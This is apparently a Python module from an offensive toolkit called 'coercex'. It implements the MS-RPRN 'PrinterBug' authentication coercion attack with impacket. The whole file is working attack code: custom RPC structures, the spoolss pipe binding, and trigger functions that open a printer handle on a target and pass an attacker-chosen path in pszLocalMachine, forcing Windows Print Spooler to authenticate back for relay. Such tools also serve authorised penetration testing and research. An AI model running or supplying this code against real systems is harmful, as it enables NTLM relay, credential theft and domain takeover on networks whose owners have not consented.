"""MS-RPRN (Print System Remote Protocol) coercion methods.

The classic PrinterBug - forces the Print Spooler to authenticate back.
"""

from __future__ import annotations

from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import DWORD, LPBYTE, LPWSTR, NULL, ULONG
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.rprn import PRINTER_HANDLE

from coercex.methods.base import CoercionMethod, PipeBinding


# -- NDRCALL classes missing from impacket -----------------------------------
# impacket only ships the Ex variant (opnum 65).  Opnum 62 has a slightly
# different wire format (cbBuffer + pBuffer instead of pOptions).


class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
    """RpcRemoteFindFirstPrinterChangeNotification (opnum 62).

    Wire format per [MS-RPRN] section 3.1.4.10.3.
    """

    opnum = 62
    structure = (
        ("hPrinter", PRINTER_HANDLE),
        ("fdwFlags", DWORD),
        ("fdwOptions", DWORD),
        ("pszLocalMachine", LPWSTR),
        ("dwPrinterLocal", DWORD),
        ("cbBuffer", DWORD),
        ("pBuffer", LPBYTE),
    )


class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
    structure = (("ErrorCode", ULONG),)


RPRN_UUID = "12345678-1234-abcd-ef00-0123456789ab"

RPRN_PIPES = [
    PipeBinding(pipe=r"\PIPE\spoolss", uuid=RPRN_UUID, version="1.0"),
]

RPRN_PATH_STYLES = [
    ("smb", "bare"),
    ("http", "bare"),
]

PROTOCOL_SHORT = "MS-RPRN"
PROTOCOL_LONG = "[MS-RPRN]: Print System Remote Protocol"


def _trigger_change_notification_ex(dce, path, target):
    """RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65).

    The classic PrinterBug. Requires opening a printer handle first.
    """
    resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
    request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
    request["pszLocalMachine"] = path
    request["pOptions"] = NULL
    dce.request(request)


def _trigger_change_notification(dce, path, target):
    """RpcRemoteFindFirstPrinterChangeNotification (opnum 62)."""
    resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
    request = RpcRemoteFindFirstPrinterChangeNotification()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
    request["fdwOptions"] = 0x00000000
    request["pszLocalMachine"] = path
    request["dwPrinterLocal"] = 0
    request["cbBuffer"] = 0
    request["pBuffer"] = NULL
    dce.request(request)


def get_methods() -> list[CoercionMethod]:
    """Return all MS-RPRN coercion methods."""
    return [
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="RpcRemoteFindFirstPrinterChangeNotificationEx",
            opnum=65,
            vuln_args=["pszLocalMachine"],
            pipe_bindings=list(RPRN_PIPES),
            path_styles=list(RPRN_PATH_STYLES),
            trigger_fn=_trigger_change_notification_ex,
            needs_target_handle=True,
            priority=2,  # PrinterBug - widely vulnerable
        ),
        CoercionMethod(
            protocol_short=PROTOCOL_SHORT,
            protocol_long=PROTOCOL_LONG,
            function_name="RpcRemoteFindFirstPrinterChangeNotification",
            opnum=62,
            vuln_args=["pszLocalMachine"],
            pipe_bindings=list(RPRN_PIPES),
            path_styles=list(RPRN_PATH_STYLES),
            trigger_fn=_trigger_change_notification,
            needs_target_handle=True,
            priority=2,  # PrinterBug variant
        ),
    ]
